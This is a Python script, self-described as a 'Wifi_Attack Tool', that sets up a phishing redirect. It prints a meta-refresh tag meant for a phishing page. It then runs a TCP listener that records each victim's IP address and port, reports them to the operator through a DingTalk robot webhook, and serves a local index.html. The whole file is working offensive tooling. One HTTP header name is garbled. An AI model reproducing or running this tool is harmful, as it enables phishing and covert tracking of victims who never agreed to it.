#!/usr/bin/python3
# @Martin 
import socket
import sys
import argparse
import datetime
import textwrap
import threading
import re
import requests

def Get_LoackHost():
    return socket.gethostbyname(socket.gethostname())
headers = {'Content-Type': 'application/json;charset=utf-8'}


class TCPINFO():
    def __init__(self, args):
        self.args = args
        self.LIP=args.LIP
        self.LPORT = args.LPORT
        self.key=args.key
        self.TOKEN=args.Token
    def run(self):
        self.DingDing_test_send()
        print("[+]Put the following code into the phishing page")
        print(f"<meta http-equiv=\"refresh\" content=\"0;url=http://{self.LIP}:{self.LPORT}\">")
        self.TCP_Listen()

    def DingDing_test_send(self):
        Message = {
            "text": {
                "content": f"=={self.key}==\nRobot Online"
            },
            "msgtype": "text"
        }
        DATA = requests.post(f"https://oapi.dingtalk.com/robot/send?access_token={self.TOKEN}",
                             headers=headers
                             , json=Message)
        if DATA.status_code == 200:
            print("[+]We have sent a test message. If not, please confirm your token and keyword!")
            return 1
        else:
            print("[ERROR]!!!Communication line failure!!!")
            return 0
    def DingDing_Send(self,IP,PORT,TIME,DATA):
        Message = {
            "text": {
                "content": f"=={self.key}==\nTarget:{IP}--Port:{PORT}\nTime:{TIME}\nStatus:{DATA}"
            },
            "msgtype": "text"
        }
        DATA = requests.post(f"https://oapi.dingtalk.com/robot/send?access_token={self.TOKEN}",
                             headers=headers
                             ,json=Message)
        if DATA.status_code == 200:
            print("[+]Message sending status ------[Success]")
        else:
            print("[-]Message sending status ------[Fail]")

    def TCP_Listen(self):
        TCP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        TCP.bind(("", self.LPORT))
        TCP.listen(50)
        while True:
            SOCK, IP = TCP.accept()

            client_thread = threading.Thread(
                target=self.Client, args=(SOCK,IP)
            )
            client_thread.start()


    def Client(self,SOCK,IP):
        print("[+]", IP[0] + ":" + str(IP[1]), "-----[Connect]",datetime.datetime.now())
        SOCK.recv(1024)
        self.DingDing_Send(IP[0],IP[1],datetime.datetime.now(),"[Online]")
        self.Send_Redirect_file(SOCK)
        SOCK.close()


    def Send_Redirect_file(self,SOCK):
        with open("./index.html", "rb") as F:
            File_DATA = F.read()
        message = "HTTP/1.1 200 OK\r\n"
        message += f"content-lexzngth:{len(File_DATA)}\r\n\r\n"
        SOCK.send(message.encode())
        SOCK.send(File_DATA)




def main():
    parser = argparse.ArgumentParser(
        description='Wifi_Attack Tool ---Martin v1.0',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Usage:
           python3 %s -lp xxx # You can define the specified port yourself
             '''% (sys.argv[0])))  # 创建解析对象
    parser.add_argument('-lp', '--LPORT', type=int, default=5555, help='Listen port')
    parser.add_argument('-li', '--LIP', default=Get_LoackHost(), help='Listen IP')
    parser.add_argument('-tk', '--Token', help='Token')
    parser.add_argument('-k', '--key', help='key word')
    args = parser.parse_args()
    TCPINFO(args).run()


if __name__ == '__main__':
    main()